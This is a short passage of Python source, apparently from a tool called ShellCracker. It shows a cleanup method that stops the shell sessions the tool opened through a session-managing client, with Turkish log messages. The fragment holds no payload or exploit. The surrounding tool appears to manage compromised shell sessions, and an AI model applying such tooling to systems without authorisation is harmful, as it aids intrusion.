        interactive_loop(self.client, sid)

    def cleanup(self) -> None:
        """Stop sessions ShellCracker opened. Does not touch pre-existing ones."""
        for sid in sorted(self._owned_sessions):
            try:
                self.client.sessions.session(sid).stop()
                logger.info("Oturum %s temizlendi", sid)
            except Exception as exc:  # noqa: BLE001 - best effort
                logger.debug("Oturum %s durdurulamadi: %s", sid, exc)
        self._owned_sessions.clear()
